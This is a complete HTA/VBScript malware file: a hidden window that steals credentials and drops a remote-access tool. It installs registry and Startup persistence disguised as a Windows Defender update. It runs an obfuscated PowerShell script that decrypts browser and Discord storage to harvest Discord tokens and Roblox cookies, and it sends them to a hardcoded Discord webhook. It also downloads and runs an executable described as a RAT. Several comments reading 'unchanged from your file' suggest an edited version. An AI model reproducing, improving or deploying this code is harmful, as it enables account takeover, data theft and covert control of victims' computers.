<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER, Q
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH   = "https://discordapp.com/api/webhooks/1556449542256197704/KXrJ2fykY1p4HlGGk5sYo-opjFomxo6OEjki9tkySBsmhZwSU-em0PN8Hvu0Iitp5ZZx"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")
Q    = Chr(34)

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    Call Persist
    Call GrabDiscord
    Call GrabRoblox
    Call DropRAT
    window.setInterval "RegrabAll()", 300000
End Sub

Sub RegrabAll()
    Call GrabDiscord
    Call GrabRoblox
End Sub

' ============================================================
' PERSISTENCE
' ============================================================

Sub Persist()
    Dim payload: payload = "mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
    Dim sf: Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta"", 0, False"
    sf.Close
    Set sf = Nothing
End Sub

' ============================================================
' DISCORD TOKEN GRABBER
' ============================================================

Sub GrabDiscord()
    Dim psPath: psPath = TmpFile("svc_net.ps1")
    Dim f: Set f = fso.CreateTextFile(psPath, True, False)

    f.WriteLine "Add-Type -AN System.Security"
    f.WriteLine "$W='" & WH & "'"
    f.WriteLine "$PC='" & PC & "'"
    f.WriteLine "$US='" & USER & "'"
    f.WriteLine "function Px($b){"
    f.WriteLine "    try{"
    f.WriteLine "        $by=[Text.Encoding]::UTF8.GetBytes($b)"
    f.WriteLine "        $rq=[Net.WebRequest]::Create($W)"
    f.WriteLine "        $rq.Method='POST';$rq.ContentType='application/json; charset=utf-8';$rq.ContentLength=$by.Length"
    f.WriteLine "        $st=$rq.GetRequestStream();$st.Write($by,0,$by.Length);$st.Close()"
    f.WriteLine "        $rq.GetResponse().Close()"
    f.WriteLine "    }catch{}"
    f.WriteLine "}"
    f.WriteLine "function SE($t,$d,$c,$fl){"
    f.WriteLine "    $e=@{title=$t;description=$d;color=$c;fields=$fl}"
    f.WriteLine "    Px((@{embeds=@($e)}|ConvertTo-Json -Depth 6 -Compress))"
    f.WriteLine "}"
    f.WriteLine "function GK($bs){"
    f.WriteLine "    try{"
    f.WriteLine "        $ls=Join-Path $bs ('Loc'+'al S'+'tate')"
    f.WriteLine "        if(!(Test-Path $ls)){return $null}"
    f.WriteLine "        $jc=Get-Content $ls -Raw|ConvertFrom-Json"
    f.WriteLine "        $ek=[Convert]::FromBase64String($jc.('os_'+'crypt').('encr'+'ypted_key'))"
    f.WriteLine "        $ek=$ek[5..($ek.Length-1)]"
    f.WriteLine "        $t='Curr'+'entUser'"
    f.WriteLine "        return [Security.Cryptography.ProtectedData]::Unprotect($ek,$null,$t)"
    f.WriteLine "    }catch{return $null}"
    f.WriteLine "}"
    f.WriteLine "function DT($enc,$key){"
    f.WriteLine "    try{"
    f.WriteLine "        if($enc.Length -lt 15){return $null}"
    f.WriteLine "        $pfx=[Text.Encoding]::ASCII.GetString($enc[0..2])"
    f.WriteLine "        if($pfx -ne 'v10' -and $pfx -ne 'v11'){return $null}"
    f.WriteLine "        $iv=$enc[3..14]"
    f.WriteLine "        $ct=$enc[15..($enc.Length-17)]"
    f.WriteLine "        $tg=$enc[($enc.Length-16)..($enc.Length-1)]"
    f.WriteLine "        $o=New-Object byte[] $ct.Length"
    f.WriteLine "        $g=[System.Security.Cryptography.AesGcm]::new([byte[]]$key)"
    f.WriteLine "        $g.Decrypt($iv,$ct,$tg,$o)"
    f.WriteLine "        $g.Dispose()"
    f.WriteLine "        return [Text.Encoding]::UTF8.GetString($o)"
    f.WriteLine "    }catch{return $null}"
    f.WriteLine "}"
    f.WriteLine "function SL($path,$key){"
    f.WriteLine "    $out=[Collections.Generic.HashSet[string]]::new()"
    f.WriteLine "    if(!(Test-Path $path)){return $out}"
    f.WriteLine "    $p1='dQw4'+'w9Wg'+'XcQ:[A-Za-z0-9+/=_-]+'"
    f.WriteLine "    $p2='[\w-]{24}\.[\w-]{6}\.[\w-]{27,28}'"
    f.WriteLine "    $p3='mfa\.[A-Za-z0-9_-]{84}'"
    f.WriteLine "    Get-ChildItem $path -Include '*.ldb','*.log' -Recurse -EA 0|%{"
    f.WriteLine "        try{"
    f.WriteLine "            $txt=[Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($_.FullName))"
    f.WriteLine "            [regex]::Matches($txt,$p1)|%{"
    f.WriteLine "                if($key){try{"
    f.WriteLine "                    $b64=$_.Value.Split(':',2)[1]"
    f.WriteLine "                    $pad=(4-(($b64.Length)%4))%4;if($pad){$b64+='='*$pad}"
    f.WriteLine "                    $d=DT([Convert]::FromBase64String($b64)) $key"
    f.WriteLine "                    if($d -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'){$out.Add($d)|Out-Null}"
    f.WriteLine "                }catch{}}"
    f.WriteLine "            }"
    f.WriteLine "            [regex]::Matches($txt,$p2)|%{$out.Add($_.Value)|Out-Null}"
    f.WriteLine "            [regex]::Matches($txt,$p3)|%{$out.Add($_.Value)|Out-Null}"
    f.WriteLine "        }catch{}"
    f.WriteLine "    }"
    f.WriteLine "    return $out"
    f.WriteLine "}"
    f.WriteLine "function VT($tok){"
    f.WriteLine "    try{"
    f.WriteLine "        $u='https://'+'disc'+'ord.com/api/v9/us'+'ers/@me'"
    f.WriteLine "        $rq=[Net.WebRequest]::Create($u)"
    f.WriteLine "        $rq.Method='GET';$rq.Timeout=8000;$rq.UserAgent='Mozilla/5.0'"
    f.WriteLine "        $rq.Headers.Add(('Auth'+'oriza'+'tion'),$tok)"
    f.WriteLine "        $j=(New-Object IO.StreamReader($rq.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json"
    f.WriteLine "        $nt=@('None','Nitro Classic','Nitro','Nitro Basic')[[int]$j.premium_type]"
    f.WriteLine "        return [PSCustomObject]@{T=$tok;U=$j.username;D=$j.discriminator;ID=$j.id;E=$j.email;Ph=$j.phone;M=$j.mfa_enabled;N=$nt}"
    f.WriteLine "    }catch{return $null}"
    f.WriteLine "}"
    f.WriteLine "$ls1='Loc'+'al S'+'torage\level'+'db'"
    f.WriteLine "$ls2='Default\Loc'+'al S'+'torage\level'+'db'"
    f.WriteLine "$TGTS=[ordered]@{"
    f.WriteLine "    'A'=""$env:APPDATA\Disc""+""ord"""
    f.WriteLine "    'B'=""$env:APPDATA\disc""+""ordcanary"""
    f.WriteLine "    'C'=""$env:APPDATA\disc""+""ordptb"""
    f.WriteLine "    'D'=""$env:LOCALAPPDATA\Google\Chr""+""ome\User Data"""
    f.WriteLine "    'E'=""$env:LOCALAPPDATA\Microsoft\Ed""+""ge\User Data"""
    f.WriteLine "    'F'=""$env:LOCALAPPDATA\BraveSoftware\Brave-Br""+""owser\User Data"""
    f.WriteLine "    'G'=""$env:APPDATA\Opera Software\Opera St""+""able"""
    f.WriteLine "    'H'=""$env:APPDATA\Opera Software\Opera GX St""+""able"""
    f.WriteLine "    'I'=""$env:LOCALAPPDATA\Vival""+""di\User Data"""
    f.WriteLine "    'J'=""$env:LOCALAPPDATA\Yandex\YandexBr""+""owser\User Data"""
    f.WriteLine "    'K'=""$env:LOCALAPPDATA\Tor""+""ch\User Data"""
    f.WriteLine "    'L'=""$env:LOCALAPPDATA\Iridi""+""um\User Data"""
    f.WriteLine "}"
    f.WriteLine "$ALL=[Collections.Generic.HashSet[string]]::new()"
    f.WriteLine "foreach($nm in $TGTS.Keys){"
    f.WriteLine "    $bs=$TGTS[$nm];if(!(Test-Path $bs)){continue}"
    f.WriteLine "    $k=GK $bs"
    f.WriteLine "    SL (Join-Path $bs $ls2) $k|%{$ALL.Add($_)|Out-Null}"
    f.WriteLine "    SL (Join-Path $bs $ls1) $k|%{$ALL.Add($_)|Out-Null}"
    f.WriteLine "    Get-ChildItem $bs -Dir -EA 0|?{$_.Name -match '^Prof'+'ile'}|%{"
    f.WriteLine "        SL (Join-Path $_.FullName $ls1) $k|%{$ALL.Add($_)|Out-Null}"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine "$vl=@();foreach($t in $ALL){$x=VT $t;if($x){$vl+=$x}}"
    f.WriteLine "foreach($r in $vl){"
    f.WriteLine "    $inf=""**$($r.U)#$($r.D)** | ID: $($r.ID)`nEmail: $($r.E) | Phone: $($r.Ph) | MFA: $($r.M) | Nitro: $($r.N)"""
    f.WriteLine "    $dc=""Token: $($r.T)"""
    f.WriteLine "    $fl=@("
    f.WriteLine "        @{name='Account';value=$inf},"
    f.WriteLine "        @{name='Target';value=""PC: $PC | $US""}"
    f.WriteLine "    )"
    f.WriteLine "    SE 'Token' $dc 5814783 $fl"
    f.WriteLine "}"
    f.WriteLine "Remove-Item '" & psPath & "' -Force -EA 0"

    f.Close
    Set f = Nothing

    Dim enc: enc = "po" & "wer" & "she" & "ll.exe"
    Dim args: args = " -NoP -NonI -W Hi" & "dden -Ep By" & "pass -File " & Q & psPath & Q
    sh.Run enc & args, 0, False
End Sub
' ============================================================
' ROBLOX COOKIE — unchanged from your file
' ============================================================

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
    Next
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(subf.Name, "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp: Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
    Dim cookie: cookie = "": Dim approach: approach = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        approach = "JSON-DPAPI"
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then
                    cookie = DecryptDPAPI(b64)
                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
                End If
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
    Dim cae: cae = InStr(cookie, "|$CAE")
    If cae = 0 Then cae = InStr(cookie, "|_CAE")
    If cae > 0 Then cookie = Mid(cookie, cae)
    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
    Call PostFile("cookie.txt", cookie)
End Sub

' ============================================================
' RAT DROP — unchanged from your file
' ============================================================

Sub DropRAT()
    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\cookiez.exe"
    Dim dl: dl = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe"
    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
    If Not fso.FileExists(temp) Then
        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
    End If
    If Not fso.FileExists(temp) Then
        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
    End If
    If fso.FileExists(temp) Then
        sh.Run Chr(34) & temp & Chr(34), 0, False
    End If
End Sub

' ============================================================
' HELPERS — unchanged from your file
' ============================================================

Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function

Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
    If i = 0 Then Exit Sub
    Dim r: r = True
    Do While r
        Set w = GetObject("winmgmts:\\.\root\cimv2")
        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
        Set w = Nothing
        If r Then WScript.Sleep 150
    Loop
End Sub

Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
Function Fetch(url): On Error Resume Next: Fetch = "": Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
    If h.Status = 200 Then Fetch = h.ResponseText
    Set h = Nothing: End Function
Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function

Sub PostEmbed(t, d, c): On Error Resume Next
    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
End Sub

Sub PostFile(fn, ct): On Error Resume Next
    Dim b: b = MkGuid()
    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
End Sub

Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
</script>
</head><body></body></html>
